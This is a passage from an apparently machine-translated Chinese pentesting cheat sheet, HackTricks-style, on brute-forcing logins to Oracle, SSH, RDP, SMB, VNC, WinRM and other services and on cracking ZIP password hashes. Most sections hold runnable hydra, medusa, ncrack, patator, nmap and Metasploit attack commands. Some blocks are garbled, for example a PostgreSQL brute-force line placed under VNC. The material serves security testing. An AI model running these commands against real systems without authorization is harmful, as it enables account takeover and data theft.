OracleSQL是一种用于管理Oracle数据库的编程语言。它可以用于执行各种数据库操作，如查询、插入、更新和删除数据。在黑客攻击中，OracleSQL可以用于暴力破解攻击，即尝试使用不同的用户名和密码组合来登录到目标数据库。

#### 暴力破解Oracle数据库

暴力破解Oracle数据库的过程包括以下步骤：

1. 枚举用户名：使用字典或常见用户名列表来尝试登录到目标数据库。可以使用工具如Hydra或Metasploit来自动化这个过程。

2. 枚举密码：对于每个有效的用户名，使用字典或常见密码列表来尝试登录。同样，可以使用工具来自动化这个过程。

3. 破解成功：如果找到了有效的用户名和密码组合，就可以成功登录到目标数据库。

#### 防御措施

为了防止暴力破解攻击，可以采取以下措施：

1. 强密码策略：确保数据库用户使用强密码，包括大写字母、小写字母、数字和特殊字符的组合。

2. 账户锁定：在一定的登录尝试失败次数后，自动锁定账户，以防止进一步的暴力破解尝试。

3. 日志监控：监控登录尝试并记录日志，以便及时发现和应对暴力破解攻击。

4. 多因素身份验证：使用多因素身份验证来增加登录的安全性，例如使用令牌或生物识别。

5. 定期更新密码：要求用户定期更改密码，以防止已泄露的密码被滥用。

请注意，暴力破解是一种非法活动，在未经授权的情况下进行暴力破解是违法的。这些信息仅供教育和安全研究目的使用。
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
为了使用**patator**进行**oracle_login**，您需要**安装**以下内容：
```bash
pip3 install cx_Oracle --upgrade
```
[离线OracleSQL哈希暴力破解](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**版本11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**和**11.2.0.3**)：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP（Post Office Protocol）是一种用于接收电子邮件的协议。它允许用户从邮件服务器上下载邮件到本地设备。POP通常使用TCP端口110进行通信。

#### POP暴力破解

POP暴力破解是一种攻击技术，通过尝试多个可能的用户名和密码组合来破解POP账户的访问凭据。攻击者可以使用自动化工具来快速尝试大量的用户名和密码，直到找到正确的组合为止。

#### POP暴力破解的防御措施

为了防止POP账户被暴力破解，可以采取以下措施：

- 使用强密码：选择一个复杂且难以猜测的密码，包括字母、数字和特殊字符。
- 启用账户锁定：在一定的失败尝试次数后，暂时锁定账户，以防止攻击者继续尝试破解。
- 使用多因素身份验证：通过使用额外的身份验证因素，如手机验证码或指纹识别，增加账户的安全性。
- 定期更改密码：定期更改密码可以减少被破解的风险。

#### POP暴力破解的风险

POP暴力破解可能导致以下风险：

- 被盗取的账户信息：如果攻击成功，攻击者可以访问受害者的邮件，可能获取敏感信息。
- 账户滥用：攻击者可以使用破解的账户发送垃圾邮件、传播恶意软件或进行其他非法活动。
- 影响声誉：如果攻击者使用破解的账户发送垃圾邮件或进行其他恶意活动，可能会损害受害者的声誉。

#### 总结

POP是一种用于接收电子邮件的协议，但它也可能成为攻击者的目标。为了保护POP账户的安全，用户应该采取适当的防御措施，如使用强密码、启用账户锁定和使用多因素身份验证。此外，定期更改密码也是减少POP暴力破解风险的一种方法。
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL是一种开源的关系型数据库管理系统（RDBMS），它提供了高度可靠性和可扩展性的数据存储解决方案。它支持广泛的数据类型和功能，包括事务处理、并发控制和多版本并发控制（MVCC）。PostgreSQL还提供了强大的安全性功能，如访问控制和数据加密。

#### 强制入侵

对于PostgreSQL数据库的强制入侵，可以使用以下方法之一：

1. 字典攻击：使用常见的用户名和密码组合进行暴力破解。可以使用工具如Hydra或Medusa来自动化这个过程。

2. 弱密码攻击：使用常见的弱密码列表进行暴力破解。可以使用工具如John the Ripper或Hashcat来破解密码哈希。

3. SQL注入：通过构造恶意的SQL查询来绕过身份验证并获取数据库访问权限。

4. 操作系统漏洞：利用操作系统上的漏洞来获取对数据库的访问权限。

#### 防御措施

为了保护PostgreSQL数据库免受强制入侵的威胁，可以采取以下措施：

1. 使用强密码：确保为数据库设置强密码，并定期更改密码。

2. 实施访问控制：限制对数据库的访问权限，并仅允许授权用户进行操作。

3. 更新和修补：定期更新和修补PostgreSQL软件和操作系统，以修复已知的漏洞。

4. 审计日志：启用和监视数据库的审计日志，以便及时检测和响应任何可疑活动。

5. 加密通信：使用SSL/TLS协议对数据库的通信进行加密，以防止数据被窃取或篡改。

6. 安全备份：定期备份数据库，并将备份存储在安全的位置，以便在发生数据丢失或损坏时进行恢复。

7. 最小权限原则：为每个用户分配最小必要的权限，以减少潜在的攻击面。

8. 安全审计：定期进行安全审计，以评估数据库的安全性并发现潜在的漏洞。

请注意，这些措施只是保护PostgreSQL数据库免受强制入侵的一部分，其他安全措施也应该被采取。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

您可以从[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)下载`.deb`软件包进行安装。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP（远程桌面协议）是一种用于远程访问和控制计算机的协议。它允许用户通过网络连接到远程计算机，并在远程计算机上执行操作。RDP通常用于远程管理和技术支持，但也可能被黑客用于非法访问和攻击目标计算机。

#### 暴力破解RDP密码

暴力破解是一种尝试所有可能的密码组合来破解目标账户的方法。对于RDP，黑客可以使用暴力破解工具来尝试破解目标计算机的密码。这些工具通常会自动化密码猜测过程，并使用字典文件或生成的密码列表进行尝试。

以下是一些常用的暴力破解RDP密码的工具：

- Hydra：一个强大的暴力破解工具，支持多种协议，包括RDP。
- Medusa：另一个流行的暴力破解工具，支持RDP和其他协议。
- Ncrack：一个网络认证破解工具，可以用于暴力破解RDP密码。

黑客可以使用这些工具来尝试破解弱密码的RDP账户。为了防止暴力破解攻击，建议使用强密码，并启用账户锁定功能，以限制登录尝试次数。

#### 防御措施

为了保护RDP免受暴力破解攻击，可以采取以下防御措施：

- 使用强密码：选择一个复杂的密码，包括字母、数字和特殊字符，并定期更改密码。
- 启用账户锁定：设置账户锁定策略，限制登录尝试次数，并在达到一定次数后锁定账户一段时间。
- 使用多因素身份验证：通过使用多因素身份验证，可以增加对RDP账户的安全性。
- 防火墙配置：限制对RDP端口（默认为3389）的访问，只允许受信任的IP地址连接。
- 更新和修补：及时安装操作系统和RDP软件的安全更新和补丁，以修复已知的漏洞。

通过采取这些防御措施，可以增强RDP的安全性，并减少暴力破解攻击的风险。
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis是一种开源的内存数据结构存储系统，常用于缓存、消息队列和实时分析等应用场景。它支持多种数据结构，如字符串、哈希表、列表、集合和有序集合，并提供了丰富的操作命令。

#### 基本信息

- 官方网站：[https://redis.io/](https://redis.io/)
- 默认端口：6379

#### 常见弱点和攻击方法

- 弱密码：使用弱密码或默认密码，容易受到暴力破解攻击。
- 未授权访问：未正确配置访问控制，导致未经授权的用户可以访问Redis服务器。
- 未更新版本：未及时更新Redis版本，可能存在已知漏洞被攻击的风险。
- 未加密通信：未启用SSL/TLS加密通信，可能导致数据被窃听或篡改。

#### 防御措施

- 使用强密码：选择强密码，并定期更换密码。
- 配置访问控制：限制仅允许授权用户访问Redis服务器，并禁用默认账户。
- 及时更新版本：及时更新Redis版本，修复已知漏洞。
- 启用SSL/TLS：启用SSL/TLS加密通信，保护数据的机密性和完整性。

#### 相关工具和资源

- [redis-cli](https://redis.io/topics/rediscli): Redis命令行客户端，用于与Redis服务器进行交互。
- [redis-stat](https://github.com/junegunn/redis-stat): Redis实时监控工具，用于监视Redis服务器的性能指标。
- [redis-desktop-manager](https://redisdesktop.com/): Redis图形化管理工具，提供可视化界面管理Redis服务器。

#### 参考链接

- [Redis官方文档](https://redis.io/documentation)
- [Redis安全性指南](https://redis.io/topics/security)
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec（Remote Execution）是一种远程执行协议，用于在远程计算机上执行命令。它通常用于在网络上执行命令，而无需登录到远程计算机。Rexec协议使用TCP端口512。

Rexec协议的工作原理如下：

1. 客户端与远程计算机建立TCP连接。
2. 客户端发送身份验证信息（用户名和密码）到远程计算机。
3. 远程计算机验证身份信息，并返回成功或失败的响应。
4. 如果身份验证成功，客户端发送要在远程计算机上执行的命令。
5. 远程计算机执行命令，并将输出发送回客户端。
6. 客户端接收并显示远程计算机的输出。

Rexec协议的安全性较低，因为它在网络上传输明文的身份验证信息。因此，建议在使用Rexec协议时采取额外的安全措施，如使用加密通道（如SSH）或使用强密码进行身份验证。

Rexec协议可以用于远程管理和执行命令，但由于其安全性较低，不建议在公共网络上使用。
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is a remote login protocol that allows users to log into a remote system over a network. It is commonly used in Unix-based systems. The protocol uses TCP port 513.

#### Brute Forcing Rlogin

To perform a brute force attack on Rlogin, you can use tools like Hydra or Medusa. These tools allow you to automate the process of trying different username and password combinations until a successful login is found.

Here is an example command using Hydra:

```plaintext
hydra -l <username> -P <password_list> rlogin://<target_ip>
```

Replace `<username>` with the target username, `<password_list>` with the path to a file containing a list of passwords, and `<target_ip>` with the IP address of the target system.

#### Countermeasures

To protect against brute force attacks on Rlogin, you can implement the following countermeasures:

1. Use strong and complex passwords that are difficult to guess.
2. Implement account lockout policies that temporarily lock an account after a certain number of failed login attempts.
3. Monitor and analyze log files for any suspicious login activity.
4. Disable Rlogin if it is not necessary for your system.

Remember to always obtain proper authorization before attempting any brute force attacks.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh（远程shell）是一种用于在远程计算机上执行命令的协议。它允许用户通过网络连接到远程主机，并在远程主机上执行命令，就像在本地主机上一样。Rsh协议通常使用TCP端口514进行通信。

Rsh协议的一个常见用途是进行暴力破解攻击。暴力破解是一种尝试所有可能的密码组合来破解密码的攻击方法。攻击者可以使用Rsh协议来远程连接到目标主机，并使用自动化工具来尝试不同的用户名和密码组合，直到找到正确的凭据为止。

然而，Rsh协议存在安全风险，因为它在网络上以明文形式传输数据，包括用户名和密码。这使得攻击者能够使用网络嗅探工具来捕获传输的数据，并获取凭据信息。为了防止这种风险，建议使用更安全的协议，如SSH（安全外壳协议），它使用加密来保护数据传输。

在进行暴力破解攻击时，攻击者可以使用各种工具和技术，如字典攻击、暴力破解工具和密码破解器。这些工具可以自动化尝试不同的密码组合，并根据不同的策略进行优化，以提高破解成功的几率。

暴力破解攻击是一种非常危险的攻击方法，因为它可能导致未经授权的访问和数据泄露。因此，建议在进行安全测试或授权渗透测试时，仅在合法的环境中使用这种技术，并遵守法律和道德准则。
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync是一种用于文件同步和传输的开源工具。它可以在本地系统之间或本地系统与远程系统之间同步文件和目录。Rsync使用快速增量算法，只传输文件的差异部分，从而减少了传输的数据量和时间。这使得Rsync成为备份和迁移大量数据的理想选择。

Rsync可以通过SSH进行安全传输，并支持各种身份验证方法，如密码、公钥和密钥文件。它还提供了许多选项和参数，以满足不同的同步需求。Rsync还具有断点续传功能，即使在传输过程中断，也可以从断点处继续传输。

Rsync的一个常见用途是在云平台上进行文件同步和备份。通过Rsync，可以将本地文件同步到云存储服务（如AWS S3、Google Cloud Storage）中，或者将云存储中的文件同步到本地系统中。这为数据的安全备份和迁移提供了便利。

要使用Rsync，可以在命令行中输入相应的命令，并指定源文件/目录和目标文件/目录。Rsync还支持使用配置文件进行更复杂的同步操作。
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP（Real-Time Streaming Protocol）是一种用于实时传输音视频数据的网络协议。它允许客户端通过发送请求来控制和获取实时流媒体数据。RTSP通常用于视频监控系统和流媒体服务器之间的通信。

#### RTSP暴力破解

RTSP暴力破解是一种攻击方法，通过尝试不同的用户名和密码组合来破解RTSP服务器的访问凭证。这种攻击方法通常使用自动化工具，如Hydra或Medusa，来自动化尝试不同的凭证组合。

#### RTSP暴力破解的步骤

1. 收集目标信息：获取目标RTSP服务器的IP地址和端口号。
2. 枚举用户名：使用字典文件或常见用户名列表来尝试不同的用户名。
3. 枚举密码：使用字典文件或常见密码列表来尝试不同的密码。
4. 进行暴力破解：使用自动化工具来尝试不同的用户名和密码组合，直到找到正确的凭证。
5. 访问目标：一旦找到正确的凭证，攻击者可以使用这些凭证来访问RTSP服务器，并获取实时流媒体数据。

#### 防御RTSP暴力破解的方法

为了防止RTSP暴力破解攻击，可以采取以下措施：

1. 使用强密码：确保为RTSP服务器设置强密码，包括字母、数字和特殊字符的组合。
2. 锁定账户：在一定的尝试次数后，锁定账户，以防止攻击者继续尝试破解凭证。
3. 使用多因素身份验证：使用多因素身份验证来增加访问RTSP服务器的安全性。
4. 监控登录尝试：监控登录尝试并记录异常活动，以及尝试破解凭证的IP地址。
5. 更新软件和设备：确保RTSP服务器和相关设备的软件和固件始终是最新的，以修复已知的安全漏洞。

#### 总结

RTSP暴力破解是一种攻击方法，通过尝试不同的用户名和密码组合来破解RTSP服务器的访问凭证。为了防止这种攻击，应采取适当的安全措施，如使用强密码、锁定账户、使用多因素身份验证等。同时，定期更新软件和设备也是保持RTSP服务器安全的重要步骤。
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP（Simple Network Management Protocol）是一种用于管理和监控网络设备的协议。它允许管理员通过发送请求和接收响应来获取和修改网络设备的信息。SNMP使用基于UDP的传输层协议来进行通信。

#### SNMP版本

SNMP有三个主要版本：SNMPv1、SNMPv2c和SNMPv3。

- SNMPv1是最早的版本，它使用明文传输数据，并且安全性较低。
- SNMPv2c是SNMPv2的一个简化版本，它在安全性方面有所改进，但仍然存在一些漏洞。
- SNMPv3是最新的版本，它提供了更强的安全性和认证机制，包括消息加密和用户身份验证。

#### SNMP攻击

由于SNMP的安全性问题，攻击者可以利用它来获取敏感信息或对网络设备进行未授权的修改。以下是一些常见的SNMP攻击技术：

- 社交工程：攻击者可以通过伪装成管理员或其他信任的实体来获取SNMP凭据。
- 字典攻击：攻击者使用字典文件中的常见凭据来尝试猜测SNMP设备的凭据。
- 弱凭据：攻击者利用弱密码或默认凭据来访问SNMP设备。
- SNMP漏洞利用：攻击者利用已知的SNMP漏洞来获取对设备的未授权访问。

#### 防御措施

为了保护网络设备免受SNMP攻击，可以采取以下防御措施：

- 使用SNMPv3：使用最新的SNMP版本，以提供更强的安全性和认证机制。
- 强密码策略：确保使用强密码来保护SNMP设备的凭据。
- 禁用不必要的SNMP功能：只启用必要的SNMP功能，并禁用不需要的功能。
- 定期更新设备固件：及时更新设备的固件和补丁，以修复已知的SNMP漏洞。
- 监控和日志记录：监控SNMP活动并记录日志，以便及时检测和响应潜在的攻击。

#### 参考资料

- [SNMP - Wikipedia](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol)
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB（Server Message Block）是一种用于在计算机之间共享文件、打印机和其他资源的网络协议。它是一种客户端-服务器协议，允许客户端请求文件或其他服务，并由服务器提供响应。

#### SMB暴力破解

SMB暴力破解是一种攻击技术，通过尝试多个可能的用户名和密码组合来破解SMB服务器的凭据。攻击者可以使用自动化工具来自动化这个过程，以快速地尝试大量的凭据组合。

以下是一些常用的SMB暴力破解工具：

- Hydra：一个强大的多协议密码破解工具，支持SMB协议。
- Medusa：一个快速、可靠的密码破解工具，支持SMB协议。
- Ncrack：一款高度可配置的网络认证破解工具，支持SMB协议。

为了成功进行SMB暴力破解，攻击者需要收集有关目标系统的信息，例如用户名列表、密码字典和目标IP地址。攻击者还可以使用字典生成器来生成可能的用户名和密码组合。

然而，SMB暴力破解是一种资源密集型的攻击，可能需要很长时间才能成功。此外，由于SMB服务器通常会有防护措施，如账户锁定和IP封锁，攻击者可能需要采取一些措施来规避这些防护措施，例如使用代理或分布式攻击。

因此，在进行SMB暴力破解时，攻击者需要谨慎操作，并确保遵守法律和道德规范。
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP（Simple Mail Transfer Protocol）是一种用于在网络上发送电子邮件的协议。它是一种基于文本的协议，用于将邮件从发送者的邮件服务器传输到接收者的邮件服务器。SMTP通常使用TCP端口25进行通信。

#### SMTP暴力破解

SMTP暴力破解是一种攻击技术，通过尝试多个可能的用户名和密码组合来破解SMTP服务器的访问凭据。攻击者可以使用自动化工具来自动化这个过程，以快速地尝试大量的凭据组合。

以下是一些常用的SMTP暴力破解工具：

- Hydra：一个强大的多协议暴力破解工具，支持SMTP等多种协议。
- Medusa：一个快速、可靠的暴力破解工具，支持SMTP等多种协议。
- Ncrack：一款高度可配置的网络认证破解工具，支持SMTP等多种协议。

为了防止SMTP暴力破解攻击，建议采取以下措施：

- 使用强密码：确保使用强密码来保护SMTP服务器的访问凭据。
- 锁定账户：在一定的失败尝试次数后，锁定账户以防止进一步的暴力破解尝试。
- 使用IP白名单：限制只有特定IP地址可以访问SMTP服务器，以减少暴力破解的风险。

请注意，暴力破解是一种非法活动，在未经授权的情况下使用这些技术可能会导致法律后果。
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS（Socket Secure）是一种网络协议，用于在客户端和服务器之间进行代理通信。它允许客户端通过代理服务器与远程服务器进行通信，从而隐藏客户端的真实IP地址。这种协议通常用于绕过防火墙限制或访问受限制的内容。

SOCKS协议的工作方式如下：

1. 客户端与代理服务器建立连接。
2. 客户端发送请求给代理服务器，请求连接到远程服务器。
3. 代理服务器将请求转发给远程服务器。
4. 远程服务器响应请求，并将响应发送给代理服务器。
5. 代理服务器将响应转发给客户端。

SOCKS协议支持多种版本，包括SOCKS4、SOCKS4a和SOCKS5。其中，SOCKS5是最新和最常用的版本，它提供了更多的功能和安全性。

使用SOCKS协议进行代理通信时，可以使用各种工具和软件，如Proxifier、Proxychains和Shadowsocks等。这些工具可以配置客户端和服务器之间的代理连接，并提供加密和身份验证等功能，以增强通信的安全性和隐私性。

尽管SOCKS协议可以用于匿名访问互联网，但它也可能被滥用用于非法活动。因此，在使用SOCKS代理时，务必遵守法律法规，并确保使用合法和道德的方式。
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH（Secure Shell）是一种加密的网络协议，用于在不安全的网络中安全地进行远程登录和执行命令。SSH使用公钥加密和身份验证来保护通信的机密性和完整性。

#### SSH暴力破解

SSH暴力破解是一种攻击技术，攻击者尝试使用不同的用户名和密码组合来登录目标主机的SSH服务。这种攻击方法依赖于猜测正确的凭据来获取未经授权的访问权限。

#### SSH暴力破解工具

以下是一些常用的SSH暴力破解工具：

- Hydra：多协议登录破解工具，支持SSH暴力破解。
- Medusa：快速、可靠的暴力破解工具，支持SSH和其他协议。
- Ncrack：网络认证破解工具，支持SSH和其他协议。

#### 防御SSH暴力破解

为了防止SSH暴力破解攻击，可以采取以下措施：

- 使用强密码：选择足够复杂和难以猜测的密码。
- 禁用root登录：禁止使用root用户登录SSH服务。
- 使用公钥身份验证：使用公钥加密和身份验证来替代密码登录。
- 使用防火墙：限制SSH服务的访问仅限于受信任的IP地址。
- 使用工具进行监控：使用入侵检测系统（IDS）和入侵防御系统（IPS）来监控和阻止暴力破解尝试。

#### SSH暴力破解的风险

SSH暴力破解攻击可能导致以下风险：

- 未经授权的访问：攻击者可以通过猜测正确的凭据来获取未经授权的访问权限。
- 数据泄露：攻击者可以访问和窃取目标主机上的敏感数据。
- 拒绝服务：大量的暴力破解尝试可能导致SSH服务不可用，从而导致拒绝服务（DoS）攻击。

#### 总结

SSH暴力破解是一种常见的攻击技术，可以通过使用强密码、禁用root登录、使用公钥身份验证、使用防火墙和监控工具等措施来防御。了解SSH暴力破解的风险可以帮助我们更好地保护我们的系统和数据安全。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### 弱SSH密钥/Debian可预测PRNG
某些系统在生成加密材料时使用的随机种子存在已知缺陷。这可能导致密钥空间大大减少，可以使用诸如[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)之类的工具进行暴力破解。还可以使用预先生成的弱密钥集，例如[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnet是一种用于远程登录和管理计算机系统的网络协议。它允许用户通过网络连接到远程主机，并在远程主机上执行命令。Telnet协议使用明文传输数据，因此不安全，容易受到中间人攻击。由于安全性问题，现在很少使用Telnet进行远程登录，而更常见的是使用安全的SSH协议。然而，在某些情况下，仍然可以使用Telnet进行特定的测试和调试。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC（Virtual Network Computing）是一种远程桌面协议，允许用户通过网络远程控制其他计算机。它通常用于远程技术支持、远程教育和远程访问计算机资源。

#### VNC暴力破解

VNC暴力破解是一种攻击方法，通过尝试不同的用户名和密码组合来破解VNC服务器的登录凭据。这种攻击方法通常使用字典攻击或暴力破解工具，如Hydra或Medusa。

#### VNC暴力破解的步骤

1. 收集目标VNC服务器的信息，包括IP地址和端口号。
2. 选择一个适当的字典文件，其中包含可能的用户名和密码组合。
3. 使用暴力破解工具，如Hydra或Medusa，设置目标VNC服务器的IP地址、端口号和字典文件。
4. 启动暴力破解工具，开始尝试不同的用户名和密码组合。
5. 如果找到正确的凭据，即可成功登录目标VNC服务器。

#### 防御VNC暴力破解的方法

为了防止VNC暴力破解攻击，可以采取以下措施：

1. 使用强密码：选择一个复杂的密码，包含字母、数字和特殊字符，并定期更改密码。
2. 禁用不必要的用户账户：只保留必要的用户账户，并禁用不再使用的账户。
3. 使用防火墙：配置防火墙以限制对VNC服务器的访问，并只允许来自可信IP地址的连接。
4. 使用VPN：通过使用虚拟专用网络（VPN）来加密VNC连接，提高安全性。
5. 监控登录尝试：监控VNC服务器的登录尝试，并设置警报机制以便及时发现暴力破解攻击。

#### VNC暴力破解的风险

VNC暴力破解攻击可能导致以下风险：

1. 未经授权的访问：攻击者可能成功登录目标VNC服务器，获取未经授权的访问权限。
2. 数据泄露：攻击者可以访问和窃取存储在目标VNC服务器上的敏感数据。
3. 恶意活动：攻击者可以在目标VNC服务器上执行恶意活动，如安装恶意软件或操纵系统设置。

因此，保护VNC服务器免受暴力破解攻击至关重要，以确保系统和数据的安全性。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm（Windows Remote Management）是一种用于远程管理Windows系统的协议。它允许管理员通过网络远程执行命令、获取信息和配置系统。Winrm使用HTTP或HTTPS作为传输协议，并使用SOAP（Simple Object Access Protocol）作为消息格式。

#### Brute Force攻击

Brute Force攻击是一种尝试所有可能的密码组合来破解系统的攻击方法。对于Winrm，可以使用Brute Force攻击来尝试猜测正确的用户名和密码组合，以获取对目标系统的访问权限。

以下是一些常用的工具和技术，可用于执行Winrm的Brute Force攻击：

- Hydra：一种强大的密码破解工具，可用于尝试不同的用户名和密码组合。
- Medusa：另一个流行的密码破解工具，支持多种协议，包括Winrm。
- Ncrack：一种高度可配置的网络认证破解工具，可用于破解Winrm密码。
- 自定义脚本：可以使用编程语言（如Python）编写自定义脚本来执行Brute Force攻击。

在执行Winrm的Brute Force攻击时，需要注意以下几点：

- 使用强大的密码字典：选择一个包含常见密码和变体的强大密码字典，以增加破解成功的机会。
- 限制尝试次数：为了避免被目标系统检测到，可以限制每个IP地址的尝试次数，并在一定时间内进行延迟。
- 使用代理：使用代理服务器来隐藏攻击者的真实IP地址，增加匿名性。

Brute Force攻击是一种强力的攻击方法，但也需要耐心和时间。在执行Brute Force攻击时，务必遵守法律和道德规范，并获得合法的授权。
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

使用[**Trickest**](https://trickest.io/)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 本地

### 在线破解数据库

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5和SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (哈希、WPA2捕获和存档MSOffice、ZIP、PDF...)
* [https://crackstation.net/](https://crackstation.net) (哈希)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (哈希和文件哈希)
* [https://hashes.org/search.php](https://hashes.org/search.php) (哈希)
* [https://www.cmd5.org/](https://www.cmd5.org) (哈希)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

在尝试暴力破解哈希之前，请查看这些内容。


### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 已知明文 zip 攻击

您需要知道加密的 zip 文件中包含的文件的明文（或部分明文）。您可以通过运行以下命令来检查加密的 zip 文件中包含的文件的文件名和文件大小：**`7z l encrypted.zip`**\
从发布页面下载 [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

